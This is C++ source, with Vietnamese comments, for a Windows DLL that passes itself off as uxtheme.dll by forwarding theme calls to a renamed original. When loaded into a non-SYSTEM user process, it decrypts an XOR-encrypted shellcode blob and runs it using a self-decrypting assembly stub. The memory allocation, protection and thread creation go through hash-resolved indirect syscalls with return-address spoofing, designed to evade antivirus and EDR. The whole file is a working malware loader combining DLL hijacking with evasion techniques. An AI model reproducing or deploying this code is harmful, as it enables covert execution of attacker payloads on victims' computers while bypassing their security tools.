
#include <windows.h>
#include <winternl.h>
#include <mutex>
#include <shlwapi.h>
#include <uxtheme.h>
#include <tlhelp32.h>
#include <string>
#include <sstream>
#include <Psapi.h> 
#include <processthreadsapi.h>
#include <sddl.h> 
#include <vector>
#include <stdio.h>
#include <stdarg.h>
#include <wtsapi32.h>
#pragma comment(lib, "Wtsapi32.lib")

#define LOG_FILE_PATH "C:\\Users\\Admin\\Desktop\\dll_log.txt"

using namespace std;
HANDLE g_hSystemWideMutex = NULL;

//void DebugLog(const char* format, ...) {
//    char buffer[1024];
//    va_list args;
//    va_start(args, format);
//    vsnprintf(buffer, sizeof(buffer), format, args);
//    va_end(args);
//
//    // 1. Gửi ra DebugView (tải tool DebugView của Sysinternals để xem)
//    OutputDebugStringA(buffer);
//
//    // 2. Ghi ra file (Mở và đóng ngay lập tức để đảm bảo dữ liệu được lưu dù có crash sau đó)
//    FILE* f = NULL;
//    if (fopen_s(&f, LOG_FILE_PATH, "a") == 0 && f != NULL) {
//        fprintf(f, "[DLL] %s\n", buffer);
//        fclose(f);
//    }
//}

// PHẦN 1: CẤU HÌNH & HASHING (Giấu tên hàm)
// Hàm băm chuỗi (Compile-time compatible)
constexpr DWORD HashString(const char* String) {
    DWORD Hash = 5381;
    while (*String) {
        Hash = ((Hash << 5) + Hash) + *String++; // Hash * 33 + c
    }
    return Hash;
}
// Hash chuẩn cho thuật toán djb2 (5381)
#define HASH_NtAllocateVirtualMemory 0x6793C34C 
#define HASH_NtProtectVirtualMemory  0x082962C8
#define HASH_NtCreateThreadEx        0xCB0C2130

// Khai báo hàm Assembly
extern "C" NTSTATUS SyscallIndirect(DWORD SSN, PVOID GadgetAddr, PVOID FakeReturnAddress, ...);

// Cấu trúc chứa thông tin cần thiết để gọi Indirect Syscall
struct SyscallInfo {
    DWORD SSN;
    PVOID SyscallAddress; // Địa chỉ lệnh "syscall" trong ntdll
    PVOID RetAddress; // RET C3
};


unsigned char encrypted_shellcode[] = {
    0xB1, 0x31, 0xD2, 0x91, 0x80, 0x9A, 0x8D, 0xAC, 0x8D, 0xAF, 0x72, 0x65, 0x74, 0x0A, 0x34, 0x38,
    0x16, 0x3D, 0x3A, 0x74, 0xA4, 0x30, 0x25, 0x0C, 0x27, 0xE5, 0x1F, 0x19, 0x1B, 0xFE, 0x22, 0x7D,
    0x3A, 0xD8, 0x37, 0x43, 0x3A, 0x6A, 0xC3, 0x01, 0x2F, 0x31, 0xCD, 0x1D, 0x22, 0x08, 0x47, 0xA8,
    0x3B, 0x58, 0xAF, 0xC2, 0x71, 0x18, 0x2F, 0x77, 0x5C, 0x45, 0x33, 0x92, 0xAC, 0x6E, 0x33, 0x64,
    0xB5, 0xA9, 0x88, 0x2B, 0x07, 0x3E, 0x3A, 0xCE, 0x24, 0x41, 0xF8, 0x2B, 0x53, 0x26, 0x4C, 0xA9,
    0x35, 0xF4, 0x08, 0x7D, 0x79, 0x51, 0x6A, 0xE6, 0x00, 0x65, 0x74, 0x4B, 0xEE, 0xF9, 0xCE, 0x6F,
    0x72, 0x45, 0x3E, 0xE4, 0xB3, 0x1D, 0x08, 0x26, 0x4C, 0xA9, 0x17, 0xFE, 0x30, 0x45, 0xF9, 0x1B,
    0x7D, 0x33, 0x3B, 0x64, 0xA4, 0xA8, 0x33, 0x31, 0xB9, 0xA6, 0x33, 0xCE, 0x42, 0xE9, 0x3B, 0x68,
    0xB9, 0x23, 0x7C, 0xB0, 0x1B, 0x44, 0xB0, 0xC9, 0x33, 0x92, 0xAC, 0x6E, 0x33, 0x64, 0xB5, 0x73,
    0x85, 0x0C, 0xB7, 0x23, 0x71, 0x09, 0x52, 0x69, 0x36, 0x50, 0xBE, 0x1B, 0x95, 0x21, 0x17, 0xFE,
    0x30, 0x41, 0x3B, 0x52, 0xB5, 0x05, 0x33, 0xEE, 0x78, 0x03, 0x21, 0xF2, 0x06, 0x73, 0x3B, 0x44,
    0xA6, 0x20, 0xF8, 0x6D, 0xE7, 0x2F, 0x15, 0x38, 0x0B, 0x3D, 0x71, 0xB5, 0x2C, 0x0A, 0x3F, 0x22,
    0x2A, 0x24, 0x2D, 0x0A, 0x3F, 0x31, 0xC5, 0x83, 0x52, 0x04, 0x24, 0x9E, 0x93, 0x31, 0x2E, 0x37,
    0x17, 0x31, 0xD8, 0x67, 0x99, 0x2E, 0x8D, 0xAC, 0x9A, 0x3E, 0x9A, 0x6E, 0x74, 0x4B, 0x65, 0x0C,
    0x35, 0x0A, 0x00, 0x76, 0x44, 0x4F, 0x17, 0x05, 0x03, 0x6E, 0x14, 0x38, 0xE9, 0x39, 0x07, 0x43,
    0x75, 0xAC, 0xB0, 0x2A, 0xB5, 0xA4, 0x74, 0x4B, 0x65, 0x79, 0xAE, 0x7D, 0x72, 0x45, 0x76, 0x28,
    0x1D, 0x03, 0x0A, 0x0D, 0x39, 0x10, 0x3C, 0x1B, 0x50, 0x36, 0x07, 0x30, 0x06, 0x06, 0x01, 0x16,
    0x74, 0x11, 0x8D, 0x72, 0x46, 0x6F, 0x72, 0x08, 0x13, 0x12, 0x00, 0x08, 0x08, 0x0B, 0x0F, 0x16,
    0x2B, 0x75, 0x31, 0x3D, 0x3A, 0x62, 0xAC, 0x22, 0xC8, 0x20, 0xF7, 0x1D, 0x62, 0x86, 0x93, 0x27,
    0x43, 0x8C, 0x37, 0xDB, 0x83, 0xDC, 0xCD, 0x38, 0xB2, 0xAC
};

const char xor_key[] = "MySuperSecretKeyForEvasion";

unsigned char stage1_stub[] = {
    // --- Lấy địa chỉ lệnh hiện tại (RIP) ---
    0xE8, 0x00, 0x00, 0x00, 0x00,       // CALL get_rip
    0x58,                               // get_rip: POP RAX

    // --- Tính toán con trỏ (có thể đã thay đổi) ---
    0x4C, 0x8D, 0x90, 0xC1, 0xFE, 0xFF, 0xFF, // LEA R10, [RAX - 319]
    0x49, 0x8D, 0x52, 0xE6,             // LEA RDX, [R10 - 0x1A]
    0x4C, 0x8B, 0xDA,                   // MOV R11, RDX

    // --- Thiết lập bộ đếm (có thể là 319) ---
    0x48, 0xC7, 0xC1, 0x3A, 0x01, 0x00, 0x00, // MOV RCX, 314

    // --- Bắt đầu vòng lặp giải mã ---
    0x41, 0x8A, 0x02,                   // MOV AL, byte ptr [R10]
    0x45, 0x8A, 0x03,                   // MOV R8B, byte ptr [R11]
    0x41, 0x32, 0xC0,                   // XOR AL, R8B
    0x41, 0x88, 0x02,                   // MOV byte ptr [R10], AL
    0x49, 0xFF, 0xC2,                   // INC R10
    0x49, 0xFF, 0xC3,                   // INC R11

    // --- Logic lặp lại key (key wrapping) ---
    0x4D, 0x8B, 0xCB,                   // MOV R9, R11
    0x4C, 0x2B, 0xCA,                   // SUB R9, RDX
    0x49, 0x83, 0xF9, 0x1A,             // CMP R9, 26
    0x75, 0x03,                         // JNE no_reset
    0x4C, 0x8B, 0xDA,                   // no_reset: MOV R11, RDX

    // --- Vòng lặp & thực thi ---
    0x48, 0xFF, 0xC9,                   // DEC RCX
    0x75, 0xDA,                         // JNZ decode_loop
    0x49, 0x81, 0xEA, 0x3A, 0x01, 0x00, 0x00, // SUB R10, 314
    0x41, 0xFF, 0xE2                    // JMP R10
};


// PARSER NTDLL (Tìm SSN và Gadget)
//// Hàm lấy thông tin Syscall bằng cách duyệt Export Table của ntdll.dll
SyscallInfo GetSyscallInfo(DWORD FunctionHash) {
    SyscallInfo info = {0 , NULL, NULL};

    PEB* peb = (PEB*)__readgsqword(0x60);// Đọc 8 byte ở GS
    // Ldr chứa danh sách các module đã nạp: ntdll.dll, kernel32.dll,...
    PEB_LDR_DATA* ldr = peb->Ldr;

    LIST_ENTRY* listHead = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* listCurrent = listHead->Flink;// Lấy phần tử đầu tiên trong DoubleLinkList

    PVOID ntdllBase = NULL;

    // Tim ntdll trong danh sach module da nap
    while (listCurrent != listHead) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->DllBase) {
            ntdllBase = entry->DllBase;

            PBYTE dllBytes = (PBYTE)ntdllBase;
            //PE file bắt đầu bằng DOS header "MZ"
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBytes;
            // e_lfanew = offset tới NT header
            PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBytes + dosHeader->e_lfanew);

            // Neu khong co export table -> khong phai ntdll
            if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0) {
                listCurrent = listCurrent->Flink;
                continue;
            }

            //exportDir:
            //số lượng tên hàm
            //số lượng ordinal
            //địa chỉ bảng tên
            //địa chỉ bảng RVA
            PIMAGE_EXPORT_DIRECTORY exportDir =
                (PIMAGE_EXPORT_DIRECTORY)(dllBytes +
                    ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            //DebugLog("[.] Scanning DLL at Base: %p", entry->DllBase);

            // Lay cac bang export
            DWORD* names = (DWORD*)(dllBytes + exportDir->AddressOfNames); // mảng RVA của tên hàm
            DWORD* functions = (DWORD*)(dllBytes + exportDir->AddressOfFunctions);// mảng RVA của code hàm
            WORD* ordinals = (WORD*)(dllBytes + exportDir->AddressOfNameOrdinals);// index map từ tên → ordinal

            bool found = false;
            // Duyệt danh sách hàm export
            for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
                const char* funcName = (const char*)(dllBytes + names[i]);

                DWORD calculatedHash = HashString(funcName);

                if (calculatedHash == FunctionHash) {
                    DWORD funcRVA = functions[ordinals[i]];
                    PBYTE funcAddr = dllBytes + funcRVA;

                    // --- TRÍCH XUẤT SSN ---
                    info.SSN = *(DWORD*)(funcAddr + 4);
                    // --- TÌM LỆNH SYSCALL GẦN ĐÓ (OF 05)
                    for (int z = 0; z < 32; z++) {
                        if (funcAddr[z] == 0x0F && funcAddr[z + 1] == 0x05) {
                            info.SyscallAddress = (PVOID)(funcAddr + z);

                            // RETURN ADDRESS;
                            for (int r = 2; r < 10; r++) { // Quét 8 byte sau lệnh syscall
                                if (funcAddr[z + r] == 0xC3) {
                                    info.RetAddress = (PVOID)(funcAddr + z + r);
                                    break; // Đã tìm thấy RET an toàn
                                }
                            }

                            if (info.RetAddress == NULL) {
                                // Nếu không tìm thấy RET an toàn trong 8 bytes, không thể thực hiện Stack Spoofing
                                //DebugLog("[-] Could not find a safe RET address after syscall.");
                                // Giữ RetAddress là NULL và thoát.
                            }
                            else {
                                //DebugLog("[+] Found safe RET address at: %p", info.RetAddress);
                            }
                            found = true;
                            //DebugLog("[+] FOUND Hash 0x%X (%s) | SSN: %d | Gadget: %p", FunctionHash, funcName, info.SSN, info.SyscallAddress);
                            break;
                        }
                    }

                    if (found) {
                        //DebugLog("[+] Found Hash 0x%X (%s) | SSN: %d (0x%X) | Gadget: %p",
                        //    FunctionHash, funcName, info.SSN, info.SSN, info.SyscallAddress);
                        break;
                    }
                }
            }

            if (found) break; // Đã tìm thấy hàm trong DLL này
        }
        listCurrent = listCurrent->Flink;
    }

    return info;
}


// === PHẦN 2: LOGIC GIẢI MÃ & THỰC THI ============================================================
// Hàm thực thi shellcode, chạy trong một luồng riêng.
void ExecuteInjectedLogic() {
    SyscallInfo alloc = GetSyscallInfo(HASH_NtAllocateVirtualMemory);
    SyscallInfo protect = GetSyscallInfo(HASH_NtProtectVirtualMemory);
    SyscallInfo create = GetSyscallInfo(HASH_NtCreateThreadEx);

    // Kiểm tra nếu tìm thất bại
    if (!alloc.SyscallAddress || !protect.SyscallAddress || !create.SyscallAddress ||
        !alloc.RetAddress || !protect.RetAddress || !create.RetAddress) {
        //DebugLog("[!] Failed to resolve syscalls or safe RetAddress. Exiting.");
        return;
    }

    // Cấu trúc bộ nhớ sẽ là: [KEY][SHELLCODE][STUB]
    SIZE_T key_size = sizeof(xor_key) - 1; // -1 để không bao gồm ký tự null
    SIZE_T shellcode_size = sizeof(encrypted_shellcode);
    SIZE_T stub_size = sizeof(stage1_stub);
    SIZE_T total_payload_size = key_size + shellcode_size + stub_size;

    HANDLE hProcess = GetCurrentProcess();
    PVOID baseAddr = NULL;
    SIZE_T size = total_payload_size;

    //DebugLog("[-] Call NtAllocateVirtualMemory. Size: %lld", size);

    NTSTATUS status = SyscallIndirect(
        alloc.SSN, alloc.SyscallAddress, alloc.RetAddress,
        hProcess, &baseAddr, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (status != 0) {
        //DebugLog("[!] NtAllocateVirtualMemory FAILED. Status: 0x%X", status);
        return; // Dừng nếu Syscall đầu tiên lỗi
    }
    //DebugLog("[+] Allocated at: %p", baseAddr);

    PBYTE pCurrent = (PBYTE)baseAddr;

    // Chép key
    RtlMoveMemory(pCurrent, xor_key, key_size);
    pCurrent += key_size;

    // Chép shellcode đã mã hóa
    RtlMoveMemory(pCurrent, encrypted_shellcode, shellcode_size);
    pCurrent += shellcode_size;

    // Chép stub và lưu lại địa chỉ của nó để thực thi
    PVOID stub_location = pCurrent;
    RtlMoveMemory(stub_location, stage1_stub, stub_size);
    //DebugLog("[-] Key/Shellcode/Stub copied. Stub Location: %p", stub_location);

    ULONG oldProtect;
    //DebugLog("[-] Call NtProtectVirtualMemory to PAGE_EXECUTE_READWRITE");
    status = SyscallIndirect(
        protect.SSN, protect.SyscallAddress, protect.RetAddress,
        hProcess, &baseAddr, &size,
        PAGE_EXECUTE_READWRITE, &oldProtect);

    if (status != 0) {
        //DebugLog("[!] NtProtectVirtualMemory FAILED. Status: 0x%X", status);
        return;
    }
    //DebugLog("[+] Memory protected with EXECUTE_READWRITE.");

    // Tạo luồng để chạy STUB (giải mã và chạy shellcode)
    HANDLE hThread = NULL;
    //DebugLog("[-] Call NtCreateThreadEx. StartAddress: %p", stub_location);

    status = SyscallIndirect(
        create.SSN, create.SyscallAddress, create.RetAddress,
        &hThread, GENERIC_EXECUTE, NULL, hProcess,
        stub_location, NULL, 0, 0, 0, 0, NULL);


    if (status != 0) {
        //DebugLog("[!] NtCreateThreadEx FAILED. Status: 0x%X", status);
        return;
    }
    else {
        if (hThread) CloseHandle(hThread);
        //DebugLog("[+] Thread created successfully.");
    }
}

// Con trỏ để lưu địa chỉ hàm DrawThemeBackground gốc
typedef HRESULT(WINAPI* FuncDrawThemeBackground)(HTHEME, HDC, int, int, const RECT*, const RECT*);
typedef HTHEME(WINAPI* FuncOpenThemeData)(HWND, LPCWSTR);

FuncDrawThemeBackground pOriginalDrawThemeBackground = NULL;
FuncOpenThemeData pOriginalOpenThemeData = NULL;
extern "C" HRESULT WINAPI MyDrawThemeBackground(HTHEME hTheme, HDC hdc, int iPartId, int iStateId, const RECT* pRect, const RECT* pClipRect) {
    if (pOriginalDrawThemeBackground) {
        HRESULT result = pOriginalDrawThemeBackground(hTheme, hdc, iPartId, iStateId, pRect, pClipRect);
        return result;
    }

    return E_FAIL;
}

extern "C" HTHEME WINAPI MyOpenThemeData(HWND hwnd, LPCWSTR pszClassList) {
    if (pOriginalOpenThemeData) {
        HTHEME originalHandle = pOriginalOpenThemeData(hwnd, pszClassList);
        return originalHandle;
    }
    return NULL;
}
bool InitializeProxyFunctions() {

    // Nạp DLL hệ thống từ vị trí đáng tin cậy của nó
    HMODULE hOriginalUxtheme = LoadLibraryA("uxtheme_.dll");
    if (hOriginalUxtheme) {
        pOriginalOpenThemeData = (FuncOpenThemeData)GetProcAddress(hOriginalUxtheme, "OpenThemeData");
        pOriginalDrawThemeBackground = (FuncDrawThemeBackground)GetProcAddress(hOriginalUxtheme, "DrawThemeBackground");
        if (pOriginalOpenThemeData && pOriginalDrawThemeBackground) {
            return true;
        }
        else {
            return false;
        }
    }
    else {
        return false;
    }
}

bool IsUserInteractiveProcess() {
    DWORD sessionId;
    DWORD processId = GetCurrentProcessId();

    if (!ProcessIdToSessionId(processId, &sessionId)) {
        return false; // Lỗi API -> An toàn nhất là không chạy
    }

    // Nếu là Session 0, đây là Services hoặc System Core -> BỎ QUA
    if (sessionId == 0) {
        return false;
    }

    // KIỂM TRA XEM CÓ PHẢI "IMMERSIVE" APP KHÔNG (UWP/Metro Apps)
    // Các app như Calculator, Settings, SearchApp thường chạy trong AppContainer
    // Payload chạy trong đây thường thiếu quyền hoặc gây crash.

    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD isAppContainer = 0;
        DWORD returnLength = 0;

        if (GetTokenInformation(hToken, TokenIsAppContainer, &isAppContainer, sizeof(isAppContainer), &returnLength)) {
            if (isAppContainer != 0) {
                CloseHandle(hToken);
                return false; // Đây là UWP App (SearchApp, Cortana...) -> BỎ QUA
            }
        }
        CloseHandle(hToken);
    }
    return true; // Đây là tiến trình người dùng bình thường (Session > 0 và không phải UWP)
}

bool IsSystemProcess() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return false;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);

    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hToken);
        return false;
    }

    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
    if (!pTokenUser) {
        CloseHandle(hToken);
        return false;
    }

    bool isSystem = false;
    // Lấy thông tin User SID
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        // Tạo SID chuẩn của Local System (S-1-5-18)
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID pSystemSid = NULL;

        if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
            0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {

            // So sánh SID hiện tại với SID của SYSTEM
            if (EqualSid(pTokenUser->User.Sid, pSystemSid)) {
                isSystem = true;
            }
            FreeSid(pSystemSid);
        }
    }

    free(pTokenUser);
    CloseHandle(hToken);
    return isSystem;
}
DWORD WINAPI MainPayloadThread(LPVOID lpParam) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = FALSE;

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(
        "D:(A;;GA;;;WD)",
        SDDL_REVISION_1,
        &(sa.lpSecurityDescriptor),
        NULL)) {

        return 1;
    }


    const char* mutexName = "Global\\{E8A3B2C1-F0D4-4E65-8A71-C7A5D6789B0F}";
    HANDLE hMutex = CreateMutexA(&sa, TRUE, mutexName);

    if (hMutex == NULL) {
        DWORD err = GetLastError();

        if (err == ERROR_ACCESS_DENIED) { // Lỗi số 5
            return 0; // Thoát êm đẹp, không coi là lỗi.
        }
        return 1;
    }

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // Mutex đã tồn tại, tiến trình này không phải là "người chiến thắng".
        CloseHandle(hMutex);
        return 0;
    }

    g_hSystemWideMutex = hMutex;
    ExecuteInjectedLogic();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
        {
            if (!InitializeProxyFunctions()) {
                // Nếu khởi tạo thất bại, có thể thoát sớm (hoặc chỉ ghi log và tiếp tục)
                return FALSE;
            }
            DisableThreadLibraryCalls(hModule);

            if (IsSystemProcess()) {
                break; // Thoát khỏi case, không chạy xuống dưới
            }

            if (IsUserInteractiveProcess()) {
                HANDLE hThread = CreateThread(NULL, 0, MainPayloadThread, NULL, 0, NULL);
                if (hThread) CloseHandle(hThread);
            }
            break;
        }
        case DLL_PROCESS_DETACH:
        {
            if (g_hSystemWideMutex != NULL) {
                ReleaseMutex(g_hSystemWideMutex);
                CloseHandle(g_hSystemWideMutex);
            }
            break;
        }
    }
    return TRUE;
}